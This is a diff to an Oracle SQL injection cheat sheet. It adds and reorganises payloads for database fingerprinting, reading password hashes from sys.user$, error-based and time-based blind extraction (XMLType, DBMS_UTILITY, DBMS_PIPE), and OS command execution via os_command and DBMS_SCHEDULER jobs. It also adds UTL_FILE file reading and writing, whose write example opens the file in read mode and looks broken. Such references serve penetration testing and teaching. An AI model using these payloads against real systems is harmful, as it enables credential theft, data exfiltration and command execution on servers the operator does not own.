@@ -7,13 +7,12 @@
 
 * [Oracle SQL Default Databases](#oracle-sql-default-databases)
 * [Oracle SQL Comments](#oracle-sql-comments)
-* [Oracle SQL Version](#oracle-sql-version)
-* [Oracle SQL Hostname](#oracle-sql-hostname)
-* [Oracle SQL Database Name](#oracle-sql-database-name)
+* [Oracle SQL Enumeration](#oracle-sql-enumeration)
 * [Oracle SQL Database Credentials](#oracle-sql-database-credentials)
-* [Oracle SQL List Databases](#oracle-sql-list-databases)
-* [Oracle SQL List Columns](#oracle-sql-list-columns)
-* [Oracle SQL List Tables](#oracle-sql-list-tables)
+* [Oracle SQL Methodology](#oracle-sql-methodology)
+    * [Oracle SQL List Databases](#oracle-sql-list-databases)
+    * [Oracle SQL List Tables](#oracle-sql-list-tables)
+    * [Oracle SQL List Columns](#oracle-sql-list-columns)
 * [Oracle SQL Error Based](#oracle-sql-error-based)
 * [Oracle SQL Blind](#oracle-sql-blind)
     * [Oracle Blind With Substring Equivalent](#oracle-blind-with-substring-equivalent)
@@ -22,6 +21,11 @@
 * [Oracle SQL Command Execution](#oracle-sql-command-execution)
     * [Oracle Java Execution](#oracle-java-execution)
     * [Oracle Java Class](#oracle-java-class)
+* [OracleSQL File Manipulation](#OracleSQL-file-manipulation)
+    * [OracleSQL Read File](#OracleSQL-read-file)
+    * [OracleSQL Write File](#OracleSQL-write-file)
+    * [Package os_command](#package-os_command)
+    * [DBMS_SCHEDULER Jobs](#dbms_scheduler-jobs)
 * [References](#references)
 
 
@@ -35,39 +39,30 @@
 
 ## Oracle SQL Comments
 
-| Type                       | Description                       |
-|----------------------------|-----------------------------------|
-| `-- -`                     | SQL comment                       |
+| Type                | Comment |
+| ------------------- | ------- |
+| Single-Line Comment | `--`    |
+| Multi-Line Comment  | `/**/`  |
 
 
-## Oracle SQL Version
+## Oracle SQL Enumeration
 
-```sql
-SELECT user FROM dual UNION SELECT * FROM v$version
-SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
-SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
-SELECT version FROM v$instance;
-```
-
-
-## Oracle SQL Hostname
-
-```sql
-SELECT host_name FROM v$instance; (Privileged)
-SELECT UTL_INADDR.get_host_name FROM dual;
-SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
-SELECT UTL_INADDR.get_host_address FROM dual;
-```
-
-
-## Oracle SQL Database Name
-
-```sql
-SELECT global_name FROM global_name;
-SELECT name FROM V$DATABASE;
-SELECT instance_name FROM V$INSTANCE;
-SELECT SYS.DATABASE_NAME FROM DUAL;
-```
+| Description   | SQL Query |
+| ------------- | ------------------------------------------------------------ |
+| DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |
+| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |
+| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |
+| DBMS version  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |
+| DBMS version  | `SELECT version FROM v$instance;`                            |
+| Hostname      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |
+| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |
+| Hostname      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |
+| Hostname      | `SELECT host_name FROM v$instance;`                          |
+| Database name | `SELECT global_name FROM global_name;`                       |
+| Database name | `SELECT name FROM V$DATABASE;`                               |
+| Database name | `SELECT instance_name FROM V$INSTANCE;`                      |
+| Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |
+| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |
 
 
 ## Oracle SQL Database Credentials
@@ -79,27 +74,29 @@ SELECT SYS.DATABASE_NAME FROM DUAL;
 | `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |
 
 
-## Oracle SQL List Databases
+## Oracle SQL Methodology
+
+### Oracle SQL List Databases
 
 ```sql
 SELECT DISTINCT owner FROM all_tables;
+SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
 ```
 
-
-## Oracle SQL List Columns
-
-```sql
-SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
-SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
-```
-
-
-## Oracle SQL List Tables
+### Oracle SQL List Tables
 
 ```sql
 SELECT table_name FROM all_tables;
 SELECT owner, table_name FROM all_tables;
 SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
+SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
+```
+
+### Oracle SQL List Columns
+
+```sql
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
+SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
 ```
 
 
@@ -115,6 +112,8 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
 | XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
 | XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
+| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -` |
+| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -` |
 
 When the injection point is inside a string use : `'||PAYLOAD--`
 
@@ -141,6 +140,7 @@ When the injection point is inside a string use : `'||PAYLOAD--`
 
 ```sql
 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
+AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
 ```
 
 
@@ -209,7 +209,38 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 
     ```sql
     SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
-    ```
+    ``` 
+
+
+### Package os_command
+
+```sql
+SELECT os_command.exec_clob('<COMMAND>') cmd from dual
+```
+
+### DBMS_SCHEDULER Jobs
+
+```sql
+DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
+```
+
+
+## OracleSQL File Manipulation
+
+:warning: Only in a stacked query.
+
+### OracleSQL Read File
+
+```sql
+utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
+```
+
+### OracleSQL Write File
+
+```sql
+utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
+```
+
 
 
 ## References
